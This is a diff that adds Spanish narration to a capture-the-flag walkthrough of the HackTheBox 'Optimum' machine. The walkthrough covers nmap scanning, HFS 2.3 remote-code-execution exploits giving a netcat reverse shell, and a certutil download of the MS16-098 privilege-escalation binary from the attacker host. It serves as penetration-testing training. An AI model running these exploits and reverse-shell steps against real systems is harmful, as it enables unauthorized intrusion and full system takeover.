@@ -15,7 +15,15 @@ layout:
 
 # Optimum
 
+`Optimum` es una máquina de nivel principiante que se centra principalmente en la enumeración de servicios con exploits conocidos. Ambos exploits son fáciles de obtener y tienen módulos Metasploit asociados, lo que hace que esta máquina sea bastante sencilla de completar.
 
+<figure><img src="../../.gitbook/assets/Optimum.png" alt="" width="563"><figcaption></figcaption></figure>
+
+***
+
+## Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>
+
+Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **Optimum**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.
 
 ```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -Pn -n 10.10.10.8 -oG allPorts
@@ -30,7 +38,7 @@ PORT   STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 101.80 seconds
 ```
 
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -43,7 +51,7 @@ Nmap done: 1 IP address (1 host up) scanned in 101.80 seconds
 [*] Ports copied to clipboard
 ```
 
-
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos.
 
 ```bash
 ❯ nmap -sCV -p80 10.10.10.8 -A -oN targeted -oX targetedXML
@@ -73,7 +81,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 16.54 seconds
 ```
 
-
+Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.
 
 ```bash
 ❯ xsltproc targetedXML > index.html
@@ -82,15 +90,25 @@ Nmap done: 1 IP address (1 host up) scanned in 16.54 seconds
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
 <figure><img src="../../.gitbook/assets/4113_vmware_9aJsmL9qd9.png" alt=""><figcaption></figcaption></figure>
 
+## Initial Access
 
+### HttpFileSirver 2.3 Exploitation - Remote Code Execution \[RCE]
 
-<figure><img src="../../.gitbook/assets/imagen.png" alt=""><figcaption></figcaption></figure>
+Accederemos a http://10.10:10.8 y comprobaremos que se trata de `HttpFileServer 2.3`.
 
+{% hint style="info" %}
+HTTP File Server es una herramienta simple que le permite acceder a los archivos de su teléfono desde una computadora de escritorio, tableta u otros dispositivos sin ningún software especial, solo un navegador web. Alternativamente, también actúa como un servidor WebDAV y cualquier cliente WebDAV puede acceder a él.
+{% endhint %}
 
+<figure><img src="../../.gitbook/assets/imagen.png" alt="" width="379"><figcaption></figcaption></figure>
+
+A través de la herramienta de `searchsploit`, buscaremos vulnerabilidades sobre esta versión de `HFS`. Nos encontramos con varias vulnerabilidades que nos permitirían ejecutar comandos arbitrarios en el equipo víctima.
+
+Nos quedaremos con el exploit de `windows/remote/49584.py`, el cual copiaremos al directorio actual.
 
 ```bash
 ❯ searchsploit HFS 2.3
@@ -117,11 +135,11 @@ File Type: ASCII text, with very long lines (546)
 Copied to: /home/kali/Desktop/HackTheBox/Windows/Normal/Optimum/Optimum/content/49584.py
 ```
 
-
+Editaremos el archivo e indicaremos nuestra dirección IP, el puerto donde estaremos en escucha. También deberemos informar el equipo víctima y el puerto donde está levantado el `HFS`.
 
 <figure><img src="../../.gitbook/assets/4116_vmware_iyrxsKZJub.png" alt=""><figcaption></figcaption></figure>
 
-
+Ejecutaremos el exploit, y comprobaremos que ganamos acceso al equipo víctima sin problemas.
 
 ```bash
 ❯ python3 49584.py
@@ -145,9 +163,9 @@ PS C:\Users\kostas\Desktop> whoami
 optimum\kostas
 ```
 
+### Rejetto HTTP File Server (HFS) 2.3.x - Remote Code Execution \[RCE] (CVE-2014-6287)
 
-
-
+Por otro lado, también nos encontramos con el siguiente exploit que probaremos también si podemos abusar de él. Nos copiaremos el exploit de `windows/remote/39161.py` en nuestro directorio actual de trabajo.
 
 ```bash
 ❯ searchsploit -m windows/remote/39161.py
@@ -160,11 +178,13 @@ File Type: Python script, ASCII text executable, with very long lines (540)
 Copied to: /home/kali/Desktop/HackTheBox/Windows/Normal/Optimum/Optimum/content/39161.py
 ```
 
-
+Editaremos el exploit para indicar nuestra dirección IP de atacante y el puerto donde estaremos en escucha.
 
 <figure><img src="../../.gitbook/assets/4117_vmware_Ywi82ttu1b.png" alt=""><figcaption></figcaption></figure>
 
+Para que funcione el exploit, deberemos de disponer del binario de `nc.exe` en nuestro equipo. Esto debido que el exploit lo que realiza es subir nuestro binario al equipo víctima y luego proporcionarnos una Reverse Shell.
 
+Compartiremos el binario a través de un servidor web.
 
 ```bash
 ❯ ls -l
@@ -174,21 +194,21 @@ Copied to: /home/kali/Desktop/HackTheBox/Windows/Normal/Optimum/Optimum/content/
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..
 ```
 
-
+En otra terminal nos pondremos en escucha para recibir la Reverse Shell.
 
 ```bash
 ❯ rlwrap -cAr nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
+Ejecutaremos dos veces el exploit indicándole la dirección IP objetivo y el puerto en donde se encuentra el `HFS` levantado.
 
 ```bash
 ❯ python2 39161.py 10.10.10.8 80
 ❯ python2 39161.py 10.10.10.8 80
 ```
 
-
+Verificaremos que ganamos acceso al equipo y podemos visualizar la flag de **user.txt**.
 
 ```bash
 ❯ rlwrap -cAr nc -nlvp 443
@@ -203,12 +223,16 @@ optimum\kostas
 
 C:\Users\kostas\Desktop>type user.txt
 type user.txt
-fa8a2a0cb5036896b5c5cfb30a4c391f
+fa8a2a0cb50*****************
 ```
 
+## Privilege Escalation
 
+### Using windows-exploit-suggester to find paths to PrivEsc&#x20;
 
-```bash
+Revisaremos la información del equipo en el cual nos encontramos. Verificamos que se trata de un `Windows Server 2012 R2 Standard`.
+
+```powershell
 C:\Users\kostas\Desktop>systeminfo
 systeminfo
 
@@ -284,9 +308,11 @@ Network Card(s):           1 NIC(s) Installed.
 Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
 ```
 
+Nos copiaremos el contenido del `systeminfo` en nuestro equipo local en un archivo llamado `systeminfo.txt`.
 
+A través de la herramienta de `windows-exploit-suggester`, buscaremos alguna vía potencial para escalar nuestros privilegios en base al `systeminfo`que le hemos indicado.
 
-
+En el resultado obtenido, verificamos diferentes vulnerabilidades que se pueden realizar en el sistema.
 
 ```bash
 ❯ ls -l
@@ -407,29 +433,35 @@ Hyper-V Requirements:      A hypervisor has been detected. Features required for
 [*] done
 ```
 
+### Exploitation MS16-098 - \[RGNOBJ] Integer Overflow
 
+Revisando los exploits y vulnerabilidades que se nos proporcionaba, nos encontramos con la siguiente `MS16-098`.
 
-
+Revisando el contenido, nos encontramos con el ID del exploit, 41020.
 
 <figure><img src="../../.gitbook/assets/4118_vmware_32Kclfkd3q.png" alt=""><figcaption></figcaption></figure>
 
+Buscaremos en el repositorio de `ExploitDB` sobre el binario del exploit. Buscaremos por el ID de la vulnerabilidad y nos descargaremos el binario que nos ofrecen.
 
+{% embed url="https://gitlab.com/exploit-database/exploitdb-bin-sploits" %}
 
 <figure><img src="../../.gitbook/assets/imagen (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Revisaremos que disponemos del binario en nuestro equipo, lo renombraremos y compartiremos a través de un servidor web.
 
 ```bash
 ❯ ls -l 41020.exe
 .rw-rw-r-- kali kali 547 KB Sat Jan 25 19:53:00 2025  41020.exe
+
 ❯ mv 41020.exe privesc.exe
+
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
+Desde el equipo víctima, nos descargaremos el binario para realizar la explotación.
 
-
-```
+```powershell
 C:\Temp>certutil.exe -f -urlcache -split http://10.10.16.5/privesc.exe C:\Temp\privesc.exe
 certutil.exe -f -urlcache -split http://10.10.16.5/privesc.exe C:\Temp\privesc.exe
 ****  Online  ****
@@ -451,9 +483,7 @@ dir
                2 Dir(s)   5.672.898.560 bytes free
 ```
 
-
-
-
+Una vez subido el binario, al ejecutarlo verificamos que nos hemos convertiro en usuario `NT AUTHORITY\SYSTEM` y visualizar la flag de **root.txt**.
 
 ```bash
 C:\Temp>privesc.exe
@@ -467,10 +497,5 @@ nt authority\system
 
 C:\Temp>type C:\Users\Administrator\Desktop\root.txt
 type C:\Users\Administrator\Desktop\root.txt
-14d342f16d0c8a811f9699973c2ab2c7
+14d342f16***********************
 ```
-
-
-
-
-
